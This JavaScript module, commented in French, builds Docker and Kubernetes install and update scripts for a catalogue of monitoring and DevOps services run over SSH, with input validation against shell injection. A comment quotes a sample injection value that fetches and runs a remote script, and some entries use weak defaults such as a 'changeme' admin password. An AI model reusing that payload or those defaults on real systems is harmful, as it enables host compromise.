// Catalogue FERMÉ de scripts d'installation des services eux-mêmes (serveur
// complet d'un outil du catalogue de configuration initiale — Prometheus,
// Grafana...), distinct d'agentCatalog.js qui installe des agents pointant
// vers un manager déjà existant. Même modèle de sécurité : uniquement l'un
// de ces scripts prédéfinis, exécuté via la clé SSH unique de la console
// (services/sshExecutor.js) — jamais de commande arbitraire ni de mot de
// passe par hôte.
//
// Seuls les outils installables via une simple image Docker officielle en
// conteneur unique sont couverts ici. Les outils nécessitant plusieurs
// conteneurs orchestrés (base de données séparée, plusieurs services liés)
// restent volontairement hors catalogue : les proposer via un unique script
// « docker run » produirait une installation cassée ou non représentative
// de leur déploiement recommandé.
function ensureDocker() {
  return `if ! command -v docker &>/dev/null; then curl -fsSL https://get.docker.com | sh; fi`;
}

// Échappement shell POSIX correct pour une valeur insérée entre guillemets
// simples : ferme la citation, insère un guillemet simple littéral échappé,
// rouvre la citation. -e 'WOODPECKER_HOST=http://${addr}' n'était PAS
// sûr tel quel : une adresse contenant un guillemet simple (ex.
// "x' && curl evil.sh|sh && echo '") permettait d'injecter des commandes
// arbitraires dans le script exécuté sur l'hôte cible via SSH — trouvé en
// auditant sshExecutor.js/serviceCatalog.js. shQuote() rend la citation
// sûre quel que soit le contenu ; assertValidHost() ci-dessous refuse en
// plus, en amont, toute adresse qui ne ressemble pas à un nom d'hôte/IP
// (défense en profondeur : les deux protections sont indépendantes).
function shQuote(value) {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

// Nom d'hôte (RFC 1123) ou IPv4/IPv6 littérale — refuse tout caractère de
// métasyntaxe shell (espace, quote, $, backtick, ;, |, &, etc.) avant même
// que la valeur n'atteigne un script exécuté à distance.
const HOST_PATTERN = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}))*)?$|^[0-9a-fA-F:]+$/;
export function assertValidHost(address) {
  const value = String(address || '').trim();
  if (!value || value.length > 253 || !HOST_PATTERN.test(value)) {
    throw Object.assign(new Error(`Adresse d'hôte invalide : "${address}" (nom d'hôte ou IP attendu, sans espace ni caractère spécial)`), { status: 400 });
  }
  return value;
}

function dockerRun({ name, image, ports = [], envVars = [], volumes = [], extraArgs = '', command = '' }) {
  const portArgs = ports.map((p) => `-p ${p}`).join(' ');
  const envArgs = envVars.map((e) => `-e ${shQuote(e)}`).join(' ');
  const volumeArgs = volumes.map((v) => `-v ${v}`).join(' ');
  return `
set -e
${ensureDocker()}
if docker inspect ${name} &>/dev/null; then echo "${name} déjà installé"; exit 0; fi
docker run -d --name ${name} --restart unless-stopped ${portArgs} ${envArgs} ${volumeArgs} ${extraArgs} ${image} ${command}
echo "${name} installé et démarré"
`.trim();
}

// Lot D3 (Groupe D) — vérification de version disponible. Tous les services
// de ce catalogue sont des images Docker taguées `:latest` (ou une version
// majeure fixe type `1`/`2`/`lts`/`community`) : il n'existe pas de numéro
// de version exposé simplement (pas de fichier VERSION lisible sans lancer
// l'outil). Le moyen honnête et sûr disponible ici est de comparer l'ID
// d'image du conteneur EN COURS D'EXÉCUTION à l'ID d'image obtenu par un
// `docker pull` du même tag — un pull ne redémarre PAS le conteneur en
// place, donc ce check n'interrompt jamais le service. Si docker pull
// échoue (registre/hôte injoignable), le script échoue (exit != 0) et la
// route appelante rapporte "vérification non disponible" — jamais de
// statut à jour/nouvelle version inventé sur un échec.
function dockerCheckUpdate({ name, image }) {
  return `
set -e
${ensureDocker()}
if ! docker inspect ${name} &>/dev/null; then echo "NOT_INSTALLED"; exit 0; fi
docker pull -q ${image} >/dev/null
LOCAL_ID=$(docker inspect --format='{{.Image}}' ${name})
REMOTE_ID=$(docker inspect --format='{{.Id}}' ${image})
if [ "$LOCAL_ID" = "$REMOTE_ID" ]; then echo "UP_TO_DATE"; else echo "UPDATE_AVAILABLE"; fi
`.trim();
}

// Mise à jour contrôlée : pull explicite de la nouvelle image, arrêt et
// recréation du conteneur avec la même config (ports/env/volumes déjà
// connus du catalogue). Volumes nommés préservés (montés à nouveau tels
// quels). N'est JAMAIS appelée automatiquement — seulement sur action
// explicite d'un admin, via une route qui vérifie d'abord le réglage
// d'autorisation (settingsStore.isServiceUpdateAllowed).
function dockerUpdate({ name, image, ports = [], envVars = [], volumes = [], extraArgs = '', command = '' }) {
  const portArgs = ports.map((p) => `-p ${p}`).join(' ');
  const envArgs = envVars.map((e) => `-e ${shQuote(e)}`).join(' ');
  const volumeArgs = volumes.map((v) => `-v ${v}`).join(' ');
  return `
set -e
${ensureDocker()}
if ! docker inspect ${name} &>/dev/null; then echo "Service non installé, mise à jour impossible" >&2; exit 1; fi
docker pull ${image}
docker stop ${name}
docker rm ${name}
docker run -d --name ${name} --restart unless-stopped ${portArgs} ${envArgs} ${volumeArgs} ${extraArgs} ${image} ${command}
echo "${name} mis à jour et redémarré"
`.trim();
}

// Chaque entrée expose `container(ctx)` (config docker canonique : nom,
// image, ports, env, volumes) réutilisée pour les 3 scripts (install/check
// update/update) — évite de dupliquer la config à chaque fois que
// buildCheckUpdateScript/buildUpdateScript en ont besoin en plus de
// buildScript (Lot D3).
const SERVICE_CATALOG = {
  prometheus: {
    label: 'Prometheus',
    port: 9090,
    container: () => ({ name: 'prometheus', image: 'prom/prometheus:latest', ports: ['9090:9090'] })
  },
  grafana: {
    label: 'Grafana',
    port: 3000,
    container: () => ({ name: 'grafana', image: 'grafana/grafana:latest', ports: ['3000:3000'], volumes: ['grafana-data:/var/lib/grafana'] })
  },
  loki: {
    label: 'Loki',
    port: 3100,
    container: () => ({ name: 'loki', image: 'grafana/loki:latest', ports: ['3100:3100'] })
  },
  alertmanager: {
    label: 'Alertmanager',
    port: 9093,
    container: () => ({ name: 'alertmanager', image: 'prom/alertmanager:latest', ports: ['9093:9093'] })
  },
  'uptime-kuma': {
    label: 'Uptime Kuma',
    port: 3001,
    container: () => ({ name: 'uptime-kuma', image: 'louislam/uptime-kuma:1', ports: ['3001:3001'], volumes: ['uptime-kuma:/app/data'] })
  },
  netdata: {
    label: 'Netdata',
    port: 19999,
    container: () => ({ name: 'netdata', image: 'netdata/netdata:latest', ports: ['19999:19999'] })
  },
  influxdb: {
    label: 'InfluxDB',
    port: 8086,
    container: () => ({ name: 'influxdb', image: 'influxdb:2', ports: ['8086:8086'], volumes: ['influxdb-data:/var/lib/influxdb2'] })
  },
  vault: {
    label: 'HashiCorp Vault',
    port: 8200,
    container: () => ({
      name: 'vault', image: 'hashicorp/vault:latest', ports: ['8200:8200'],
      envVars: ["VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200"], extraArgs: '--cap-add=IPC_LOCK'
    })
  },
  crowdsec: {
    label: 'CrowdSec',
    port: 8080,
    container: () => ({ name: 'crowdsec', image: 'crowdsecurity/crowdsec:latest', ports: ['8080:8080'], volumes: ['crowdsec-data:/var/lib/crowdsec/data'] })
  },
  gitea: {
    label: 'Gitea',
    port: 3000,
    container: () => ({ name: 'gitea', image: 'gitea/gitea:latest', ports: ['3000:3000', '2222:22'], volumes: ['gitea-data:/data'] })
  },
  sonarqube: {
    label: 'SonarQube',
    port: 9000,
    container: () => ({ name: 'sonarqube', image: 'sonarqube:community', ports: ['9000:9000'], volumes: ['sonarqube-data:/opt/sonarqube/data'] })
  },
  jenkins: {
    label: 'Jenkins',
    port: 8080,
    container: () => ({ name: 'jenkins', image: 'jenkins/jenkins:lts', ports: ['8080:8080', '50000:50000'], volumes: ['jenkins-data:/var/jenkins_home'] })
  },
  keycloak: {
    label: 'Keycloak',
    port: 8080,
    container: () => ({
      name: 'keycloak', image: 'quay.io/keycloak/keycloak:latest', ports: ['8080:8080'],
      envVars: ['KEYCLOAK_ADMIN=admin', 'KEYCLOAK_ADMIN_PASSWORD=changeme'], command: 'start-dev'
    })
  },
  gitlab: {
    label: 'GitLab',
    port: 8929,
    container: () => ({ name: 'gitlab', image: 'gitlab/gitlab-ce:latest', ports: ['8929:80', '2224:22'], volumes: ['gitlab-config:/etc/gitlab', 'gitlab-data:/var/opt/gitlab', 'gitlab-logs:/var/log/gitlab'] })
  },
  woodpecker: {
    label: 'Woodpecker CI',
    port: 8000,
    container: (ctx) => ({
      name: 'woodpecker-server', image: 'woodpeckerci/woodpecker-server:latest', ports: ['8000:8000'],
      envVars: [`WOODPECKER_HOST=http://${ctx?.address || 'localhost'}:8000`, 'WOODPECKER_OPEN=true']
    })
  },
  'step-ca': {
    label: 'step-ca',
    port: 9000,
    container: (ctx) => ({
      name: 'step-ca', image: 'smallstep/step-ca:latest', ports: ['9000:9000'], volumes: ['step-ca-data:/home/step'],
      envVars: ['DOCKER_STEPCA_INIT_NAME=Nexus Homelab CA', `DOCKER_STEPCA_INIT_DNS_NAMES=${ctx?.address || 'localhost'}`]
    })
  },
  trivy: {
    label: 'Trivy',
    port: 4954,
    container: () => ({ name: 'trivy', image: 'aquasec/trivy:latest', ports: ['4954:4954'], command: 'server --listen 0.0.0.0:4954' })
  }
};

export function listInstallableIds() {
  return Object.keys(SERVICE_CATALOG);
}

export function isInstallable(toolId) {
  return Object.prototype.hasOwnProperty.call(SERVICE_CATALOG, toolId);
}

export function getServiceMeta(toolId) {
  const entry = SERVICE_CATALOG[toolId];
  return entry ? { label: entry.label, port: entry.port } : null;
}

function safeContext(entry, ctx = {}) {
  // ctx.address vient de la requête (adresse de la machine cible) et se
  // retrouve interpolée dans certains scripts (woodpecker, step-ca) : validée
  // ici, une seule fois, avant d'atteindre la moindre config — défense en
  // profondeur en plus de shQuote() dans dockerRun/dockerUpdate.
  const safeCtx = ctx.address !== undefined ? { ...ctx, address: assertValidHost(ctx.address) } : ctx;
  return entry.container(safeCtx);
}

export function buildServiceScript(toolId, ctx = {}) {
  const entry = SERVICE_CATALOG[toolId];
  if (!entry) throw Object.assign(new Error(`Installation automatique indisponible pour "${toolId}"`), { status: 409 });
  return dockerRun(safeContext(entry, ctx));
}

// Lot D3 : tous les services de ce catalogue sont des conteneurs Docker
// uniques (voir commentaire d'en-tête), donc tous supportent la même
// méthode de vérification/mise à jour générique — pas de service "non
// supporté" dans ce catalogue à ce jour, mais la fonction reste conçue pour
// pouvoir renvoyer null si un futur service ne s'y prêtait pas.
export function supportsUpdateCheck(toolId) {
  return isInstallable(toolId);
}

export function buildCheckUpdateScript(toolId, ctx = {}) {
  const entry = SERVICE_CATALOG[toolId];
  if (!entry) throw Object.assign(new Error(`Vérification indisponible pour "${toolId}"`), { status: 409 });
  return dockerCheckUpdate(safeContext(entry, ctx));
}

export function buildUpdateScript(toolId, ctx = {}) {
  const entry = SERVICE_CATALOG[toolId];
  if (!entry) throw Object.assign(new Error(`Mise à jour indisponible pour "${toolId}"`), { status: 409 });
  return dockerUpdate(safeContext(entry, ctx));
}

// Lot D4 (Groupe D) — installation sans machine imposée : quand aucun hôte
// SSH n'est ciblé, on propose de déployer l'outil sur un cluster Kubernetes
// déjà configuré plutôt que d'obliger à créer/choisir une machine. Comme
// tous les outils du catalogue sont de simples conteneurs Docker uniques
// (voir commentaire d'en-tête), la conversion vers un Deployment + Service
// K8s minimal est mécanique à partir de la même config `container()`.
// Limite assumée et documentée (todo.md) : les volumes déclarés dans
// container() ne sont PAS traduits en volumes K8s persistants ici (emptyDir
// implicite / pas de volume monté) — un PVC dédié par outil demanderait de
// connaître la classe de stockage du cluster cible, inconnue de la console.
// Les données de ces outils ne survivront donc pas à un redémarrage du pod
// tant que cette limite n'est pas levée.
export function isK8sInstallable(toolId) {
  return isInstallable(toolId);
}

export function buildK8sManifests(toolId, { namespace = 'default' } = {}) {
  const entry = SERVICE_CATALOG[toolId];
  if (!entry) throw Object.assign(new Error(`Installation Kubernetes indisponible pour "${toolId}"`), { status: 409 });
  const cfg = entry.container({});
  const name = cfg.name;
  const containerPorts = (cfg.ports || []).map((p) => {
    const [hostPort, containerPort] = String(p).split(':');
    return Number(containerPort || hostPort);
  }).filter((n) => Number.isFinite(n));
  const env = (cfg.envVars || []).map((e) => {
    const idx = String(e).indexOf('=');
    return idx === -1 ? { name: e, value: '' } : { name: e.slice(0, idx), value: e.slice(idx + 1) };
  });

  const deployment = {
    apiVersion: 'apps/v1', kind: 'Deployment',
    metadata: { name, namespace, labels: { app: name, 'nexus.managed-by': 'nexus-console' } },
    spec: {
      replicas: 1,
      selector: { matchLabels: { app: name } },
      template: {
        metadata: { labels: { app: name } },
        spec: {
          containers: [{
            name,
            image: cfg.image,
            ports: containerPorts.map((containerPort) => ({ containerPort })),
            env,
            ...(cfg.command ? { command: ['sh', '-c', cfg.command] } : {})
          }]
        }
      }
    }
  };

  const service = containerPorts.length ? {
    apiVersion: 'v1', kind: 'Service',
    metadata: { name, namespace, labels: { app: name, 'nexus.managed-by': 'nexus-console' } },
    spec: {
      selector: { app: name },
      ports: containerPorts.map((p) => ({ port: p, targetPort: p, name: `port-${p}` })),
      type: 'ClusterIP'
    }
  } : null;

  return { deployment, service };
}
